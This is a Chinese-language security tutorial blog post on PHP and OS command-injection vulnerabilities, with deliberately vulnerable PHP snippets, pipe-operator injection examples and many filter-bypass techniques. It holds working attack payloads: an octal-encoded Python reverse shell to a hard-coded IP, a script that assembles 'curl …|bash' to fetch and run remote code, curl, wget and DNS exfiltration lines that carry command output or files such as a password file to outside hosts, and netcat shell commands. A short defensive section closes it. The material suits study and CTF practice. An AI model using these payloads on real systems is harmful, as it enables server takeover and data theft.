# PHP安全学习—命令执行漏洞

Author: H3rmesk1t

Data: 2021.05.28

# 漏洞描述

命令执行漏洞是指服务器没有对执行的命令进行过滤，用户可以随意执行系统命令，命令执行漏洞属于高危漏洞之一
如PHP的命令执行漏洞主要是基于一些函数的参数过滤不足导致，可以执行命令的函数有system( )、exec( )、shell_exec( )、passthru( )、pcntl_execl( )、popen( )、proc_open( )等，当攻击者可以控制这些函数中的参数时，就可以将恶意的系统命令拼接到正常命令中，从而造成命令执行攻击
PHP执行命令是继承WebServer用户的权限，这个用户一般都有权限向Web目录写文件，可见该漏洞的危害性相当大

# 漏洞原理

应用程序有时需要调用一些执行系统命令的函数,如在PHP中，使用system、exec、shell_exec、passthru、popen、proc_popen等函数可以执行系统命令，当黑客能控制这些函数中的参数时，就可以将恶意的系统命令拼接到正常命令中，从而造成命令执行漏洞

# 漏洞危害

- 继承Web服务器程序的权限，去执行系统命令或读写文件
- 反弹shell
- 控制整个网站，甚至控制整个服务器

# 漏洞产生的原因

>1. 没有对用户输入进行过滤或过滤不严
例如，没有过滤&、&&、|、||等连接符
>2. 系统漏洞造成的命令执行
bash破壳漏洞(CVE-2014-6271)，该漏洞可以构造环境变量的值来执行具有攻击力的脚本代码，会影响到bash交互的多种应用，如http、ssh和dhcp等
>3. 调用的第三方组件存在代码执行漏洞
例如：
php(system()、shell_exec()、exec()、eval())
JAVA中的命令执行漏洞(struts2/ElasticsearchGroovy等)
ThinkPHP命令执行

# 命令执行与代码执行的区别

- 代码执行：执行效果完全依赖于语言本身
- 命令执行：执行效果不受语言本身、命令本身的限制

# 常见的危险函数

>1. php代码相关
eval()
assert()
preg_replace
call_user_func()
call_user_func_array()
create_function
array_map()
>2.  系统命令执行相关
system()
passthru()
exec()
pcntl_exec()
shell_exec()
popen()
proc_open()
`(反单引号)
ob_start()
>3. 特殊函数
phpinfo()
#这个文件里面包含了PHP的编译选项，启动的扩展、版本、服务器配置信息、环境变量、操作系统信息、path变量等非常重要的敏感配置信息
symlink()：
#一般是在linux服务器上使用的，为一个目标建立一个连接，在读取这个链接所连接的文件的内容，并返回内容
getenv
#获取一个环境变量的值
putenv(\$a) 
#添加\$a到服务器环境变量，但环境变量仅存活于当前请求期间。 在请求结束时环境会恢复到初始状态
# 命令执行的类型
- 代码层过滤不严格
- 系统的漏洞造成命令注入
- 调用的第三方组件存在代码执行漏洞

# 危险函数利用
## system
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210528075238539.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0xZSjIwMDEwNzI4,size_16,color_FFFFFF,t_70#pic_center)

```php
<?php
highlight_file(__FILE__);

if(isset($_REQUEST['url'])){
    $url = ($_REQUEST['url']);
    $b = system($url, $a);
    echo $a.PHP_EOL;
    echo $b.PHP_EOL;
}
?>
```

恶意代码执行
`?url=dir`

![在这里插入图片描述](https://img-blog.csdnimg.cn/20210528075803812.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0xZSjIwMDEwNzI4,size_16,color_FFFFFF,t_70#pic_center)

文件写入
>`?url=echo 1111 flag.php`
>
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210528080038947.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0xZSjIwMDEwNzI4,size_16,color_FFFFFF,t_70#pic_center)
## passthru
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210528080213501.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0xZSjIwMDEwNzI4,size_16,color_FFFFFF,t_70#pic_center)

```php
<?php
highlight_file(__FILE__);

if(isset($_REQUEST['url'])){
    $url = ($_REQUEST['url']);
    passthru($url,$a);
    echo $a.PHP_EOL;
}
?>
```

文件写入
`?url=dir 22.txt`

![在这里插入图片描述](https://img-blog.csdnimg.cn/2021052808065822.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0xZSjIwMDEwNzI4,size_16,color_FFFFFF,t_70#pic_center)

## exec
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210528080825303.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0xZSjIwMDEwNzI4,size_16,color_FFFFFF,t_70#pic_center)

```php
需要注意的一点exec要有echo才有回显

<?php
highlight_file(__FILE__);

if(isset($_REQUEST['url'])){
    $url = ($_REQUEST['url']);
    echo exec($url);
}
?>
```
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210528081337546.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0xZSjIwMDEwNzI4,size_16,color_FFFFFF,t_70#pic_center)
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210528081344441.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0xZSjIwMDEwNzI4,size_16,color_FFFFFF,t_70#pic_center)

## shell_exec
![在这里插入图片描述](https://img-blog.csdnimg.cn/2021052808150682.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0xZSjIwMDEwNzI4,size_16,color_FFFFFF,t_70#pic_center)

```php
<?php
highlight_file(__FILE__);

if(isset($_REQUEST['url'])){
    $url = ($_REQUEST['url']);
    echo shell_exec($url);
}
?>
```
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210528081700336.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0xZSjIwMDEwNzI4,size_16,color_FFFFFF,t_70#pic_center)
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210528081707312.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0xZSjIwMDEwNzI4,size_16,color_FFFFFF,t_70#pic_center)
## `(反引号)

```php
<?php
highlight_file(__FILE__);

if(isset($_REQUEST['url'])){
    $url = ($_REQUEST['url']);
    echo `$url`;
}
?>
```
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210528081904584.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0xZSjIwMDEwNzI4,size_16,color_FFFFFF,t_70#pic_center)
# escapeshellarg/escapeshellcmd

参考之前的文章：[利用/绕过escapeshellarg/escapeshellcmd](https://blog.csdn.net/LYJ20010728/article/details/116902085)

# OS命令执行

部分Web应用程序提供了一些命令执行的操作，例如，如果想测试 http://www.test.com 是否可以正常连接，那么web应用程序底层就很可能去调用系统操作命令，如果此处没有过滤好用户输入的数据，例如管道连接符，就很有可能形成系统命令执行漏洞
## WINDOWS系统支持的管道符

>“|”：直接执行后面的语句
例如：`ping www.baidu.com|whoami`

![在这里插入图片描述](https://img-blog.csdnimg.cn/20210528082504931.png#pic_center)

“||”：如果前面执行的语句执行出错，则执行后面的语句
例如：`png www.baidu.com||whoami`

![在这里插入图片描述](https://img-blog.csdnimg.cn/20210528082607434.png#pic_center)

>“&”：如果前面的语句为假则直接执行后面的语句，前面的语句可真可假
例如：`png www.baidu.com&whoami`或者`ping www.baidu.com&whoami`

![在这里插入图片描述](https://img-blog.csdnimg.cn/20210528082816366.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0xZSjIwMDEwNzI4,size_16,color_FFFFFF,t_70#pic_center)

“&&”：如果前面的语句为真先执行第一个命令后执行第二个命令；为假则直接出错，也不执行后面的语句
例如：`ping www.baidu.com&&whoami`    `png www.baidu.com&&whoami`

![在这里插入图片描述](https://img-blog.csdnimg.cn/20210528082954761.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0xZSjIwMDEwNzI4,size_16,color_FFFFFF,t_70#pic_center)
## LINUX系统支持的管道符
“；”执行完前面的命令执行后面的

![在这里插入图片描述](https://img-blog.csdnimg.cn/20210528083323438.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0xZSjIwMDEwNzI4,size_16,color_FFFFFF,t_70#pic_center)
>“|”：显示后面语句的执行结果

![在这里插入图片描述](https://img-blog.csdnimg.cn/20210528083434865.png#pic_center)
>“||”：当前面的语句执行出错时，执行后面的语句

![在这里插入图片描述](https://img-blog.csdnimg.cn/20210528083531185.png#pic_center)
>“&”：如果前面的语句为假，则直接指向后面的语句，前面的语句可真可假

![在这里插入图片描述](https://img-blog.csdnimg.cn/20210528083708890.png#pic_center)

>“&&”：如果前面的语句为假则直接出错，也不执行后面的语句

![在这里插入图片描述](https://img-blog.csdnimg.cn/2021052808373236.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0xZSjIwMDEwNzI4,size_16,color_FFFFFF,t_70#pic_center)
# Java
>这里之所以叫作Java 命令执行，是因为Java 体系非常庞大，其中包括：Java SE、Java EE、Java ME。而无论是分支还是框架，都是以Java SE 为基础的
Java EE 之前被称为J2EE，Java EE 是在Java SE 的基础上构建的，它提供Web服务、组件模型、管理和通信API，可以用来实现企业级的面向服务体系结构（service-oriented architecture，SOA）和Web 2.0应用程序开发
在Java SE 中，存在Runtime 类，在该类中提供了exec 方法用以在单独的进程中执行指定的字符串命令，像JSP、Servlet、 Struts、 Spring、 Hibernate 等技术一般执行外部程序都会调用此方法（或者使用ProcessBuilder类，但较少），下面以 Runtime类为例进行说明，模型代码如下:

```java
import java. io.InputStream;  //导包操作
import java. io.InputStreamReader;
import java. io.BufferedReader;
public class RuntimeTest{
  public static void main (String args []) throws Exception{
    if (args.length==0) {
      System.exit(1);  //没有参数就退出
    }
    String command = args[0];
    Runtime run = Runtime.getRuntime();
    Process pro = run. exec(command);  //执行命令
    InputStreamReader in = new InputStreamReader(pro.getInputStream());
    BufferedReader buff = new BufferedReader(in);
    for(String temp = buff.readLine();temp!=null;temp=buff.readLine()){
      System.out.println(temp);  //输出结果
    }
  buff .close();
  in.close();
  }
}
```

上面的代码经过编译后可以执行命令操作，如： java RuntimeTest “whoami”，执行命令操作

![在这里插入图片描述](https://img-blog.csdnimg.cn/20210528084212977.png#pic_center)
# Python

代码执行

```python
exec(string)		# Python代码的动态执行
eval(string)		# 返回表达式或代码对象的值
execfile(string)	# 从一个文件中读取和执行Python脚本
input(string)		# Python2.x 中 input() 相等于 eval(raw_input(prompt)) ，用来获取控制台的输入
compile(string)		# 将源字符串编译为可执行对象
```

命令执行

```python
system()		# 执行系统指令
popen()			# popen()方法用于从一个命令打开一个管道
subprocess.call # 执行由参数提供的命令
spawn 			# 执行命令
```

# 常见过滤绕过
## 编码绕过

如果命令注入的网站过滤了某些分割符，可以将分隔符编码后（url编码，base64等）绕过

## 八进制绕过

$(printf "\154\163")//ls命令，这个编码后可以拼接

```php
//这里过滤了-.等符号，只允许0-9a-zA-Z">\\\$();
echo$IFS$9$(printf$IFS$9"\163\75\137\137\151\155\160\157\162\164\137\137\50\42\163\157\143\153\145\164\42\51\56\163\157\143\153\145\164\50\137\137\151\155\160\157\162\164\137\137\50\42\163\157\143\153\145\164\42\51\56\101\106\137\111\116\105\124\54\137\137\151\155\160\157\162\164\137\137\50\42\163\157\143\153\145\164\42\51\56\123\117\103\113\137\123\124\122\105\101\115\51\73\163\56\143\157\156\156\145\143\164\50\50\42\64\67\56\61\60\60\56\61\62\60\56\61\62\63\42\54\62\63\63\63\51\51\73\137\137\151\155\160\157\162\164\137\137\50\42\157\163\42\51\56\144\165\160\62\50\163\56\146\151\154\145\156\157\50\51\54\60\51\73\137\137\151\155\160\157\162\164\137\137\50\42\157\163\42\51\56\144\165\160\62\50\163\56\146\151\154\145\156\157\50\51\54\61\51\73\137\137\151\155\160\157\162\164\137\137\50\42\157\163\42\51\56\144\165\160\62\50\163\56\146\151\154\145\156\157\50\51\54\62\51\73\160\75\137\137\151\155\160\157\162\164\137\137\50\42\163\165\142\160\162\157\143\145\163\163\42\51\56\143\141\154\154\50\133\42\57\142\151\156\57\142\141\163\150\42\54\42\55\151\42\135\51\73")>$(printf$IFS$9"\57")detect$(printf$IFS$9"\56")py
echo 'python反弹shell的payload' /detect.py
```

```python
from flask import Flask
from flask import render_template,request
import subprocess,re
app = Flask(__name__)

@app.route('/',methods=['GET'])
def index():
    return render_template('index.html')

@app.route('/run',methods=['POST'])
def run():
    cmd = request.form.get("cmd")
    if re.search(r'''[^0-9a-zA-Z">\\\$();]''',cmd):
        return 'Hacker!'
    if re.search(r'''ping|wget|curl|bash|perl|python|php|kill|ps''',cmd):
        return 'Hacker!'
    p = subprocess.Popen(cmd,stderr=subprocess.STDOUT, stdout=subprocess.PIPE,shell=True,close_fds=True)
    try:
        (msg, errs) = p.communicate(timeout=5)
        return msg
    except Exception as e:
        return 'Error!'

app.run(host='0.0.0.0',port='5000')
```
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210528085106453.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0xZSjIwMDEwNzI4,size_16,color_FFFFFF,t_70#pic_center)

## 十六进制绕过

`echo "636174202F6574632F706173737764" | xxd -r -p|bash`

![在这里插入图片描述](https://img-blog.csdnimg.cn/2021052815065447.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0xZSjIwMDEwNzI4,size_16,color_FFFFFF,t_70#pic_center)

## 十六进制字符序列
值得注意的是，这种方法不适用于所有PHP函数，这种变量函数方法不能用于构造诸如echo、print、unset()、isset()、empty()、include、require等系统特殊函数，但可以使用包装函数来构造它们

![在这里插入图片描述](https://img-blog.csdnimg.cn/20210528150438166.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0xZSjIwMDEwNzI4,size_16,color_FFFFFF,t_70#pic_center)

## 空格过滤

linux内置分隔符：\${IFS}，\$IFS，\$IFS$9

![在这里插入图片描述](https://img-blog.csdnimg.cn/20210528094008120.png#pic_center)
利用重定向符`<>`

![在这里插入图片描述](https://img-blog.csdnimg.cn/20210528094206846.png#pic_center)


## >，+过滤
对于 >,+ 等 符号的过滤 ，\$PS2变量为>，\$PS4变量则为+

![在这里插入图片描述](https://img-blog.csdnimg.cn/20210528093759328.png#pic_center)

## 关键词绕过

- 通过拆分命令达到绕过的效果：`a=l;b=s;$a$b`
- 空变量绕过：`cat fl${x}ag`    `cat tes$(z)t/flag`
- 控制环境变量绕过：
先利用`echo $PATH`得到环境变量 ="/usr/local/….blablabla”
接着利用`echo ${#PATH}`得到长度
然后要哪个字符截取哪个字符就行
${PATH:0:1} ='/'
${PATH:1:1} ='u'
${PATH:0:4} ='/usr'
- 空值绕过：`cat fl""ag`    `cat fl''ag`    `cat "fl""ag"`
- 反斜杠绕过：`ca\t flag`     `l\s`

![在这里插入图片描述](https://img-blog.csdnimg.cn/20210528093241745.png#pic_center)
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210528093649570.png#pic_center)

## 空变量

\$*和\$@，\$x(x 代表 1-9)，\${x}(x>=10)：比如`ca${21}t a.txt`表示`cat a.txt`
在没有传入参数的情况下，这些特殊字符默认为空，如下:
- wh$1oami
- who$@ami
- whoa$*mi

![在这里插入图片描述](https://img-blog.csdnimg.cn/2021052809053980.png#pic_center)

## 花括号的用法

在Linux bash中还可以使用`{OS_COMMAND,ARGUMENT}`来执行系统命令`{cat,flag}`

![在这里插入图片描述](https://img-blog.csdnimg.cn/2021052809285025.png#pic_center)

## 无回显的命令执行

可以通过curl命令将命令的结果输出到访问的url中：

```php
curl www.rayi.vip/`whoami`
```

在服务器日志中可看到：`xx.xx.xx.xx - - [12/Aug/2019:10:32:10 +0800] "GET /root HTTP/1.1" 404 146 "-" "curl/7.58.0"`，这样，命令的回显就能在日志中看到了

## 读文件命令

```php
ls|bash|tac|nl|more|less|head|wget|tail|vi|cat|od|grep|sed|bzmore|bzless|pcre|paste|diff|file|echo|sort|cut|xxd
```

无回显的情况下wget带出：`wget  --post-file flag 47.100.120.123:2333`

## 长度绕过

详细见[P牛文章](https://www.leavesongs.com/SHARE/some-tricks-from-my-secret-group.html)
linux命令执行的时候可以使用反斜杠换行；bash脚本中同样适用上面的规则；可以用文件名加反斜杠构成命令，使用ls -t o 将文件名输出到文件，使用bash o执行脚本

![在这里插入图片描述](https://img-blog.csdnimg.cn/20210528091115666.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0xZSjIwMDEwNzI4,size_16,color_FFFFFF,t_70#pic_center)
构造ls -t

```php
命令：>ls\\			#生成一个文件名为ls\的文件
命令：ls>_			#为了确保ls -t 中ls在前面，所以要先使用ls>_将ls输入到文件_中
命令：>\ \\			#生成ls -t之间的空格，一个文件名为 \的文件
命令：>-t\\			#生成文件名为-t\的文件
命令：>\>g			#生成文件名为>g的文件
命令：ls>>_			#将所有的文件名写到文件_里
命令：sh _			#由上至下按顺序执行由\拼接起来的ls -t命令，并将结果输入到文件g中
```

```python
import requests
from time import sleep
import urllib

payload = [
    # generate `ls -t>g` file
    '>ls\\', 
    'ls>_', 
    '>\ \\', 
    '>-t\\', 
    '>\>g', 
    'ls>>_', 
    
    # generate `curl www.rayi.vip|bash` 
    # 注意文件名不能以.开头
    # 注意文件名不能有重复
    # 注意vps只能用index，因为文件名不能以/开头
    # 悲剧的是我的vps的ip正好有俩0.，只能用域名了
    '>sh\ ', 
    '>ba\\', 
    '>\|\\',
    '>p\\',
    '>vi\\',
    '>i.\\', 
    '>y\\',
    '>ra\\', 
    '>w.\\', 
    '>ww\\', 
    '>\ \\', 
    '>rl\\', 
    '>cu\\', 
    # exec
    'sh _', 
    #先执行ls -t>g
    'sh g'
   
]

r = requests.get('http://url/?reset=1')
for i in payload:
    assert len(i) <= 5 
    r = requests.get('http://url/?cmd=' + urllib.parse.quote(i) )
    print(i)
    sleep(1)
```

## get_defined_functions

get_defined_functions系统函数会返回一个多维数组，该数组包含一个所有已定义函数（包括内部函数和用户定义函数）列表；内部函数可以通过`$arr["internal"]`来表示，用户定义的函数可以使用`$arr["user"]`来表示
例如：`php -r 'print_r(get_defined_functions()[internal]);'`

![在这里插入图片描述](https://img-blog.csdnimg.cn/20210528113430978.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0xZSjIwMDEwNzI4,size_16,color_FFFFFF,t_70#pic_center)

以上就是在不使用系统函数的名称的情况下引用系统函数的另一种方式，如果我们筛选字符串`"system"`，可以找出它的索引号，并利用这种方式使用它：`php -r 'print_r(get_defined_functions()[internal]);' | grep 'system'`

![在这里插入图片描述](https://img-blog.csdnimg.cn/20210528113517621.png#pic_center)

利用这种方式绕过WAF和代码中的安全过滤：
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210528114446389.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0xZSjIwMDEwNzI4,size_16,color_FFFFFF,t_70#pic_center)
## 字符数组
PHP中的每个字符串都可视为一个字符数组，并且可以通过语法`$string[2]`或 `$string[-3]`来引用单个字符，这同时也是另一种绕过安全规则的方法
例如，仅仅使用字符串`$a="elmsty/ ";`，我就可以组成命令执行语句`system("ls /tmp");`(测试PHP版本>7.0)

![在这里插入图片描述](https://img-blog.csdnimg.cn/20210528145804484.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0xZSjIwMDEwNzI4,size_16,color_FFFFFF,t_70#pic_center)

## 引号逃逸

在PHP中字符串并不总是伴随着引号我们可以主动声明它的类型，像例如`$a = (string)foo;`在这种情况下，变量`$a`就是字符串`“foo”`
此外，还可以使用圆括号，如下图：

![在这里插入图片描述](https://img-blog.csdnimg.cn/20210528144140685.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0xZSjIwMDEwNzI4,size_16,color_FFFFFF,t_70#pic_center)

第一种绕过方式：使用(system)(ls);，但因为不能使用“system”这个字符串，所以我们可以用字符串连接，例如(sy.(st).em)(ls);

![在这里插入图片描述](https://img-blog.csdnimg.cn/20210528144414796.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0xZSjIwMDEwNzI4,size_16,color_FFFFFF,t_70#pic_center)
>第二种绕过方式：使用变量`$_GET`，如果我发送这样一个请求`?a=system&b=ls&code=$_GET[a]($_GET[b]);`，在代码执行中`$_GET[a]`和`$_GET[b]`会被`system`和`ls`所替代，最终绕过引号的安全限制

![在这里插入图片描述](https://img-blog.csdnimg.cn/20210528144844834.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0xZSjIwMDEwNzI4,size_16,color_FFFFFF,t_70#pic_center)

# DNSlog外带
利用域名解析请求
- 假设我们有个可控的二级域名，那么目标发出三级域名解析的时候，我们这边是能够拿到它的域名解析请求的，可以配合DNS请求进行命令执行的判断，这一般被称为dnslog
- 要通过dns请求即可通过ping命令，也能通过curl命令，只要对域名进行访问，让域名服务器进行域名解析就可实现
- 例：可以去ceye.io注册个账号，注册完后会给一个域名，如果有域名解析请求会有记录；如得到的域名是test.ceye.io，当有主机访问1111. test.ceye.io时，就会记录下来这个域名解析请求；其中1111可以替换成我们需要获取的信息；如：`cat /data/secret/password.txt | while read exfil; do host $exfil.contextis.com 192.168.107.135; done`

![在这里插入图片描述](https://img-blog.csdnimg.cn/20210528092154214.png#pic_center)
Wireshark抓包

![在这里插入图片描述](https://img-blog.csdnimg.cn/20210528092217871.png#pic_center)
# 反弹shell

```bash
nc -L -p 9090-e cmd.exe (Windows)

nc -l -p 9090-e /bin/bash (*nix)
```

# 防范措施

>1. 在PHP下禁用高危系统函数
找到php.ini，查找到disable_functions，添加禁用的函数名
>2. 参数的值尽量使用引号包括，并在拼接前调用addslashes进行转义
>3. 不执行外部的应用程序或命令
尽量使用自定义函数或函数库实现外部应用程序或命令的功能。在执行system、eval等命令执行功能的函数前，要确认参数内容
>4. 使用escapeshellarg函数处理相关参数
escapeshellarg函数会将用户引起参数或命令结束的字符进行转义，如单引号"'"会被转义为"\’"，双引号“””会被转义为"\""，分号";"会被转义为"\;"，这样escapeshellarg会将参数内容限制在一对单引号或双引号里面，转义参数中包括的单引号或双引号，使其无法对当前执行进行截断，实现防范命令注入攻击的目的
>5. 使用safe_mode_exec_dir指定可执行的文件路径
将php.ini文件中的safe_mode设置为On，然后将允许执行的文件放入一个目录，并使用safe_mode_exec_dir指定这个可执行的文件路径；这样，在需要执行相应的外部程序时，程序必须在safe_mode_exec_dir指定的目录中才会允许执行，否则执行将失败
